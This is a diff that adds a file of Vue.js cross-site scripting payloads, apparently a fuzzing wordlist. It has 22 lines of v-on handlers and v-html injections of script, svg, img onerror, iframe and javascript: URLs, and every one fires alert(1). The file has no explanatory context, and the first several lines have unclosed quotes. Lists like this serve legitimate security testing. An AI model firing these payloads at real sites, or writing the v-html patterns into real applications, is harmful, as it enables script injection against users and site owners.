@@ -1,0 +1,22 @@
+[VUE] [VUE] @click="alert(1)
+[VUE] [VUE] v-on:load="alert(1)
+[VUE] [VUE] v-on:focus="alert(1)
+[VUE] [VUE] v-on:error="alert(1)
+[VUE] [VUE] v-on:mouseover="alert(1)
+[VUE] [VUE] <div v-on:click="alert(1)">click</div>
+[VUE] [VUE] <div v-html="'<svg onload=alert(1)>'"></div>
+[VUE] [VUE] <div v-html="'<script>alert(1)</script>'"></div>
+[VUE] [VUE] <div v-html="'<marquee onstart=alert(1)>'"></div>
+[VUE] [VUE] <div v-html="'<img src=x onerror=alert(1)>'"></div>
+[VUE] [VUE] <div v-html="'<embed src=javascript:alert(1)>'"></div>
+[VUE] [VUE] <div v-html="'<details open ontoggle=alert(1)>'"></div>
+[VUE] [VUE] <div v-html="'<iframe src=javascript:alert(1)>'"></div>
+[VUE] [VUE] <div v-html="'<object data=javascript:alert(1)>'"></div>
+[VUE] [VUE] <div v-html="'<a href=javascript:alert(1)>X</a>'"></div>
+[VUE] [VUE] <div v-html="'<video src=x onerror=alert(1)></video>'"></div>
+[VUE] [VUE] <div v-html="'<audio src=x onerror=alert(1)></audio>'"></div>
+[VUE] [VUE] <div v-html="'<embed src=javascript:alert(1)></embed>'"></div>
+[VUE] [VUE] <div v-html="'<iframe src=javascript:alert(1)></iframe>'"></div>
+[VUE] [VUE] <div v-html="'<object data=javascript:alert(1)></object>'"></div>
+[VUE] [VUE] <div v-html="'<form action=javascript:alert(1)><button>X</button></form>'"></div>
+[VUE] [VUE] <div v-html="'<math><mi xlink:href=data:x/x,<script>alert(1)</script>></mi></math>'"></div>
